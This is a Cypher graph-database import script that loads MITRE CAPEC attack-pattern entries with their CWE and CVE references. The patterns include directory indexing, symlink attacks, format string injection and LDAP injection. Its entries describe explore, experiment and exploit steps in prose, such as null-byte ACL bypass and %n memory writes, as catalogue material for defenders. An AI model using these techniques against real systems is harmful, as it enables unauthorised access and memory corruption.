CREATE (:Indicator{id: 4, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Error 403 Forbidden message displays. The access to directory indexing is blocked by the web server.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of files within a requested directory."});
CREATE (:Outcome{id: 2, type: "Success", description: "A \"File not found\" error messages along with invalid path name."});
CREATE (:Outcome{id: 3, type: "Success", description: "The directory index page shows that there are some sub-directories or files available in the current directory"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Read directories or files which are not intended for public viewing.", description: "<div level=\"0\">\n  <p class=\"text\">The adversary attempts to access the discovered directories that allow access and may attempt to bypass server or application level ACLs by using manual or automated methods</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Try multiple exploit techniques to list directory contents for directories that will not reveal their contents with a \"/\" request</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Try other known exploits to elevate privileges sufficient to bypass protected directories.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">List the files in the directory by issuing a request with the URL ending in a \"/\" slash.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Access the files via direct URL and capture contents.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 5, description: "<div level=\"0\">\n  <p class=\"text\">Attempt to bypass ACLs on directories by using methods that are known to work against some server types by appending data to the directory request. For instance, appending a Null byte to the end of the request which may cause an ACL to fail and allow access.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 6, description: "<div level=\"0\">\n  <p class=\"text\">Sequentially request a list of common base files to each directory discovered.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">A request for the directory name yields a directory listing</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Either an application or server exploit yields a directory listing</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Errors 401 or 403 indicate access to directory indexing is blocked by the web server and all methods tried have yielded no success to bypass the ACL or elevate the adversary's privileges.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Directory contents are accessible to the attacker."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Detective"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:SecurityControl{id: 5, type: "Preventative"});
CREATE (:SecurityControl{id: 6, type: "Preventative"});
CREATE (:SecurityControl{id: 7, type: "Corrective"});
MERGE (:Reference{id: "REF-1", local_id: "R.127.1", title: "WASC Threat Classification 2.0", section: "WASC-16 - Directory Indexing", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Directory-Indexing"});
MERGE (:Reference{local_id: "R.127.2", author: "ATT&CK Project", title: "File system enumeration (1083)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/File_system_enumeration"});
MERGE (:CWE{id: 424});
MERGE (:CWE{id: 425});
MERGE (:CWE{id: 288});
MERGE (:CWE{id: 285});
MERGE (:CWE{id: 732});
MERGE (:CWE{id: 276});
MERGE (:CWE{id: 693});
MERGE (:CWE{id: 721});
CREATE (:ResourcesRequired{id: 29, text: "<div level=\"0\">\n  <p class=\"text\">Ability to send HTTP requests to a web application.</p>\n</div>"});
CREATE (:AttackPattern{id: 128, name: "Integer Attacks", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 64, text: "<div level=\"0\">\n  <p class=\"text\">The target application must have an integer variable for which only some of the possible integer values are expected by the application and where there are no checks on the value of the variable before use.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 65, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to manipulate the targeted integer variable such that normal operations result in non-standard values due to the storage structure of integers.</p>\n</div>"});
CREATE (:Submission{id: 103});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 71});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 103, summary: "OrderedDict([('Text', 'An attacker takes advantage of the structure of integer variables to cause these variables to assume values that are not expected by an application. For example, adding one to the largest positive integer in a signed integer variable results in a negative number. Negative numbers may be illegal in an application and the application may prevent an attacker from providing them directly, but the application may not consider that adding two positive numbers can create a negative number do to the structure of integer storage formats.')])"});
MERGE (:CWE{id: 682});
CREATE (:ResourcesRequired{id: 30, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required.</p>\n</div>"});
CREATE (:AttackPattern{id: 129, name: "Pointer Manipulation", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 66, text: "<div level=\"0\">\n  <p class=\"text\">The target application must have a pointer variable that the attacker can influence to hold an arbitrary value.</p>\n</div>"});
CREATE (:Submission{id: 104});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 72});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Description Summary, Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 22, name: "Pointer Attack"});
MERGE (:Date{date: "2017-01-09"});
CREATE (:Description{id: 104, summary: "OrderedDict([('Text', 'This attack pattern involves an adversary manipulating a pointer within a target application resulting in the application accessing an unintended memory location. This can result in the crashing of the application or, for certain pointer values, access to data that would not normally be possible or the execution of arbitrary code. Since pointers are simply integer variables, Integer Attacks may often be used in Pointer Attacks.')])"});
MERGE (:CWE{id: 682});
CREATE (:ResourcesRequired{id: 31, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required for most forms of this attack.</p>\n</div>"});
CREATE (:AttackPattern{id: 13, name: "Subverting Environment Variable Values", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 67, text: "<div level=\"0\">\n  <p class=\"text\">An environment variable is accessible to the user.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 68, text: "<div level=\"0\">\n  <p class=\"text\">An environment variable used by the application can be tainted with user supplied data.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 69, text: "<div level=\"0\">\n  <p class=\"text\">Input data used in an environment variable is not validated properly.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 70, text: "<div level=\"0\">\n  <p class=\"text\">The variables encapsulation is not done properly. For instance setting a variable as public in a class makes it visible and an attacker may attempt to manipulate that variable.</p>\n</div>"});
CREATE (:Submission{id: 105});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 73});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 105, summary: "OrderedDict([('Text', \"The attacker directly or indirectly modifies environment variables used by or controlling the target software. The attacker's goal is to cause the target software to deviate from its expected operation in a manner that benefits the attacker.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker probes the application for information. Which version of the application is running? Are there known environment variables? etc.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker gains control of an environment variable and ties to find out what process(es) the environment variable controls.</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker modifies the environment variable to abuse the normal flow of processes or to gain access to privileged resources.</p>\n</div>"});
MERGE (:Reference{id: "REF-2", local_id: "R.13.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{id: "REF-3", local_id: "R.13.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-20 - Input Validation", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/20.html"});
CREATE (:CVE{id: "CVE-2006-4244", description: "<div level=\"0\">\n  <p class=\"text\">SQL-Ledger 2.4.4 through 2.6.17 authenticates users by verifying that the value of the sql-ledger-[username] cookie matches the value of the sessionid parameter, which allows remote attackers to gain access as any logged-in user by setting the cookie and the parameter to the same value.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2006-2734", description: "<div level=\"0\">\n  <p class=\"text\">enter.asp in Mini-Nuke 2.3 and earlier makes it easier for remote attackers to conduct password guessing attacks by setting the guvenlik parameter to the same value as the hidden gguvenlik parameter, which bypasses a verification step because the guvenlik parameter is assumed to be immutable by the attacker.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2006-2527", description: "<div level=\"0\">\n  <p class=\"text\">Admin/admin.php in phpBazar 2.1.0 and earlier allows remote attackers to bypass the authentication process and gain unauthorized access to the administrative section by setting the action parameter to edit_member and the value parameter to 1.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2006-1505", description: "<div level=\"0\">\n  <p class=\"text\">base_maintenance.php in Basic Analysis and Security Engine (BASE) before 1.2.4 (melissa), when running in standalone mode, allows remote attackers to bypass authentication, possibly by setting the standalone parameter to \"yes\".</p>\n</div>"});
MERGE (:CWE{id: 353});
MERGE (:CWE{id: 285});
MERGE (:CWE{id: 302});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 15});
MERGE (:CWE{id: 73});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 200});
CREATE (:AttackPattern{id: 130, name: "Excessive Allocation", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 71, text: "<div level=\"0\">\n  <p class=\"text\">The target must accept service requests from the attacker and the adversary must be able to control the resource allocation associated with this request to be in excess of the normal allocation. The latter is usually accomplished through the presence of a bug on the target that allows the adversary to manipulate variables used in the allocation.</p>\n</div>"});
CREATE (:Submission{id: 106});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 74});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Examples-Instances, Injection_Vector, Payload, Payload_Activation_Impact, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 106, summary: "OrderedDict([('Text', \"An adversary causes the target to allocate excessive resources to servicing the attackers' request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.\")])"});
MERGE (:CWE{id: 770});
MERGE (:CWE{id: 404});
CREATE (:ResourcesRequired{id: 33, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required for this attack.</p>\n</div>"});
CREATE (:AttackPattern{id: 131, name: "Resource Leak Exposure", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 72, text: "<div level=\"0\">\n  <p class=\"text\">The target must have a resource leak that the adversary can repeatedly trigger.</p>\n</div>"});
CREATE (:Submission{id: 107});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 75});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 107, summary: "OrderedDict([('Text', \"An adversary utilizes a resource leak on the target to deplete the quantity of the resource available to service legitimate requests. Resource leaks most often come in the form of memory leaks where memory is allocated but never released after it has served its purpose, however, theoretically, any other resource that can be reserved can be targeted if the target fails to release the reservation when the reserved resource block is no longer needed. In this attack, the adversary determines what activity results in leaked resources and then triggers that activity on the target. Since some leaks may be small, this may require a large number of requests by the adversary. However, this attack differs from a flooding attack in that the rate of requests is generally not significant. This is because the lost resources due to the leak accumulate until the target is reset, usually by restarting it. Thus, a resource-poor adversary who would be unable to flood the target can still utilize this attack. Resource depletion through leak differs from resource depletion through allocation in that, in the former, the adversary may not be able to control the size of each leaked allocation, but instead allows the leak to accumulate until it is large enough to affect the target's performance. When depleting resources through allocation, the allocated resource may eventually be released by the target so the attack relies on making sure that the allocation size itself is prohibitive of normal operations by the target.\")])"});
MERGE (:CWE{id: 404});
CREATE (:ResourcesRequired{id: 34, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required for this attack.</p>\n</div>"});
CREATE (:AttackPattern{id: 132, name: "Symlink Attack", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 73, text: "<div level=\"0\">\n  <p class=\"text\">The targeted application must perform the desired activities on a file without checking whether the file is a symbolic link or not. The attacker must be able to predict the name of the file the target application is modifying and be able to create a new symbolic link where that file would appear.</p>\n</div>"});
CREATE (:Submission{id: 108});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 76});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated References"});
CREATE (:Description{id: 108, summary: "OrderedDict([('Text', \"An attacker positions a symbolic link in such a manner that the targeted user or application accesses the link's endpoint, assuming that it is accessing a file with the link's name. The endpoint file may be either output or input. If the file is output, the result is that the endpoint is modified, instead of a file at the intended location. Modifications to the endpoint file may include appending, overwriting, corrupting, changing permissions, or other modifications. In some variants of this attack the attacker may be able to control the change to a file while in other cases they cannot. The former is especially damaging since the attacker may be able to grant themselves increased privileges or insert false information, but the latter can also be damaging as it can expose sensitive information or corrupt or destroy vital system or application files. Alternatively, the endpoint file may serve as input to the targeted application. This can be used to feed malformed input into the target or to cause the target to process different information, possibly allowing the attacker to control the actions of the target or to cause the target to expose information to the attacker. Moreover, the actions taken on the endpoint file are undertaken with the permissions of the targeted user or application, which may exceed the permissions that the attacker would normally have.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Identify Target", description: "<div level=\"0\">\n  <p class=\"text\">Attacker identifies the target application by determining whether there is sufficient check before writing data to a file and creating symlinks to files in different directories.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker writes to files in different directories to check whether the application has sufficient checking before file operations.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The attacker creates symlinks to files in different directories.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The application does not check whether the file is a symlink or not before writing data to it.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The system allows creating symlinks.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Some directories do not allow creating symlink.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">The application checks whether the file is a symlink or not before writing data to it.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The application does not check whether the file is a symlink or not before writing data to it and the attacker can create symlinks to the files."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Try to create symlinks to different files", description: "<div level=\"0\">\n  <p class=\"text\">The attacker then uses a variety of techniques, such as monitoring or guessing to create symlinks to the files accessed by the target application in the directories which are identified in the explore phase.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker monitors the file operations performed by the target application using a tool like dtrace or FileMon. And the attacker can delay the operations by using \"sleep(2)\" and \"usleep()\" to prepare the appropriate conditions for the attack, or make the application perform expansive tasks (large files parsing, etc.) depending on the purpose of the application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The attacker may need a little guesswork on the filenames on which the target application would operate.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">The attacker tries to create symlinks to the various filenames.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The attacker can create symlinks to the files in the target directories.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker creates symlink to the files while the target application is operating on the file."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Target application operates on created symlinks to sensitive files", description: "<div level=\"0\">\n  <p class=\"text\">The attacker is able to create symlinks to sensitive files while the target application is operating on the file.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Create the symlink to the sensitive file such as configuration files, etc.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker creates symlinks to sensitive files and the target application operates on them leading to a breach in the security assumptions of the target application."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
MERGE (:Reference{local_id: "R.132.1", author: "Shaun Colley", title: "Crafting Symlinks for Fun and Profit", link: "http://www.infosecwriters.com/texts.php?op=display&id=159"});
MERGE (:Reference{local_id: "R.132.2", author: "ATT&CK Project", title: "Shortcut Modification (1023)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Shortcut_modification"});
MERGE (:CWE{id: 59});
CREATE (:ResourcesRequired{id: 35, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required beyond the ability to create the necessary symbolic link.</p>\n</div>"});
CREATE (:AttackPattern{id: 133, name: "Try All Common Switches", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 74, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to control the options or switches sent to the target.</p>\n</div>"});
CREATE (:Submission{id: 109});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 77});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 23, name: "Try All Common Application Switches and Options"});
MERGE (:Date{date: "2015-12-07"});
CREATE (:Description{id: 109, summary: "OrderedDict([('Text', 'An attacker attempts to invoke all common switches and options in the target application for the purpose of discovering weaknesses in the target. For example, in some applications, adding a --debug switch causes debugging information to be displayed, which can sometimes reveal sensitive processing or configuration information to an attacker. This attack differs from other forms of API abuse in that the attacker is blindly attempting to invoke options in the hope that one of them will work rather than specifically targeting a known option. Nonetheless, even if the attacker is familiar with the published options of a targeted application this attack method may still be fruitful as it might discover unpublicized functionality.')])"});
MERGE (:CWE{id: 559});
MERGE (:CWE{id: 656});
MERGE (:CWE{id: 88});
CREATE (:ResourcesRequired{id: 36, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required beyond the ability to send requests to the target.</p>\n</div>"});
CREATE (:AttackPattern{id: 134, name: "Email Injection", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 75, text: "<div level=\"0\">\n  <p class=\"text\">The target application must allow users to send email to some recipient, must allow the user to specify the content at least one header field in the message, and must fail to sanitize against the injection of command separators.</p>\n</div>"});
CREATE (:Submission{id: 110});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 110, summary: "OrderedDict([('Text', 'An attacker manipulates the headers and content of an email message by injecting data via the use of delimiter characters native to the protocol. Many applications allow users to send email messages by filling in fields. For example, a web site may have a link to \"share this site with a friend\" where the user provides the recipient\\'s email address and the web application fills out all the other fields, such as the subject and body. In this pattern, an attacker adds header and body information to an email message by injecting additional content in an input field used to construct a header of the mail message. This attack takes advantage of the fact that RFC 822 requires that headers in a mail message be separated by a carriage return. As a result, an attacker can inject new headers or content simply by adding a delimiting carriage return and then supplying the new heading and body information. This attack will not work if the user can only supply the message body since a carriage return in the body is treated as a normal character.')])"});
CREATE (:ResourcesRequired{id: 37, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required beyond access to the target mail application.</p>\n</div>"});
CREATE (:AttackPattern{id: 135, name: "Format String Injection", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 76, text: "<div level=\"0\">\n  <p class=\"text\">The target application must accept a strings as user input, fail to sanitize string formatting characters in the user input, and process this string using functions that interpret string formatting characters.</p>\n</div>"});
CREATE (:Submission{id: 111});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 111, summary: "OrderedDict([('Text', 'An attacker includes formatting characters in a string input field on the target application. Most applications assume that users will provide static text and may respond unpredictably to the presence of formatting character. For example, in certain functions of the C programming languages such as printf, the formatting character %s will print the contents of a memory location expecting this location to identify a string and the formatting character %n prints the number of DWORD written in the memory. An attacker can use this to read or write to memory locations or files, or simply to manipulate the value of the resulting text in unexpected ways. Reading or writing memory may result in program crashes and writing memory could result in the execution of arbitrary code if the attacker can write to the program stack.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Survey application", description: "<div level=\"0\">\n  <p class=\"text\">The attacker takes an inventory of the entry points of the application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Spider web sites for all available links</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">List parameters, external variables, configuration files variables, etc. that are possibly used by the application.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "At least one data input to application identified."});
CREATE (:Outcome{id: 2, type: "Inconclusive", description: "No inputs to application identified. Note that just because no inputs are identified does not mean that the application will not accept any."});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Determine user-controllable input susceptible to format string injection", description: "<div level=\"0\">\n  <p class=\"text\">Determine the user-controllable input susceptible to format string injection. For each user-controllable input that the attacker suspects is vulnerable to format string injection, attempt to inject formatting characters such as %n, %s, etc.. The goal is to manipulate the string creation using these formatting characters.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Inject probe payload which contains formatting characters (%s, %d, %n, etc.) through input parameters.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Attacker receives normal response from server.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Attacker receives an abnormal message (let's say with a partial dump of the memory) from the application which indicates that the format string was successfully manipulated.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "At least one user-controllable input susceptible to injection found."});
CREATE (:Outcome{id: 2, type: "Failure", description: "No user-controllable input susceptible to injection found."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Try to exploit the Format String Injection vulnerability", description: "<div level=\"0\">\n  <p class=\"text\">After determining that a given input is vulnerable to format string injection, hypothesize what the underlying usage looks like and the associated constraints.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Insert various formatting characters to read or write the memory, e.g. overwrite return address, etc.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Probing via format character injection was successful in identifying vulnerable input.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Probing via format character injection failed in identifying vulnerable input.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Attacker achieves goal of reading or writing the memory, manipulating the formatting string"});
CREATE (:Outcome{id: 2, type: "Inconclusive", description: "Attacker unable to exploit the format string injection vulnerability"});
MERGE (:Reference{local_id: "R.135.1", author: "['Hal Burch', 'Brendan Saulsbury']", title: "FIO30-C. Exclude user input from format strings", publisher: "CERT", pubdate: "May 2011", link: "https://www.securecoding.cert.org/confluence/display/seccode/FIO30-C.+Exclude+user+input+from+format+strings"});
MERGE (:Reference{id: "REF-1", local_id: "R.135.2", author: "Robert Auger", title: "WASC Threat Classification 2.0", section: "WASC-06 - Format String", publisher: "The Web Application Security Consortium (WASC)", pubdate: "Feb 2009", link: "http://projects.webappsec.org/Format-String"});
MERGE (:Reference{id: "REF-5", local_id: "R.135.3", author: "Fortify", title: "The OWASP Application Security Desk Reference", section: "Format String", publisher: "The Open Web Application Security Project (OWASP)", pubdate: "2010", link: "https://www.owasp.org/index.php/Format_String"});
MERGE (:CWE{id: 134});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 133});
CREATE (:ResourcesRequired{id: 38, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required beyond the ability to provide string input to the target.</p>\n</div>"});
CREATE (:AttackPattern{id: 136, name: "LDAP Injection", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 77, text: "<div level=\"0\">\n  <p class=\"text\">The target application must accept a string as user input, fail to sanitize characters that have a special meaning in LDAP queries in the user input, and insert the user-supplied string in an LDAP query which is then processed.</p>\n</div>"});
CREATE (:Submission{id: 112});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 112, summary: "OrderedDict([('Text', 'An attacker manipulates or crafts an LDAP query for the purpose of undermining the security of the target. Some applications use user input to create LDAP queries that are processed by an LDAP server. For example, a user might provide their username during authentication and the username might be inserted in an LDAP query during the authentication process. An attacker could use this input to inject additional commands into an LDAP query that could disclose sensitive information. For example, entering a * in the aforementioned query might return information about all users on the system. This attack is very similar to an SQL injection attack in that it manipulates a query to gather additional information or coerce a particular return value.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Survey application", description: "<div level=\"0\">\n  <p class=\"text\">The attacker takes an inventory of the entry points of the application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Spider web sites for all available links</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Sniff network communications with application using a utility such as WireShark.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "At least one data input to application identified."});
CREATE (:Outcome{id: 2, type: "Failure", description: "No inputs to application identified. Note that just because no inputs are identified does not mean that the application will not accept any."});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Determine user-controllable input susceptible to LDAP injection", description: "<div level=\"0\">\n  <p class=\"text\">For each user-controllable input that the attacker suspects is vulnerable to LDAP injection, attempt to inject characters that have special meaning in LDAP (such as a single quote character, etc.). The goal is to create a LDAP query with an invalid syntax</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use web browser to inject input through text fields or through HTTP GET parameters</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, or other HTTP header.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use modified client (modified by reverse engineering) to inject input.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Attacker receives normal response from server.</p>\n</div>"});
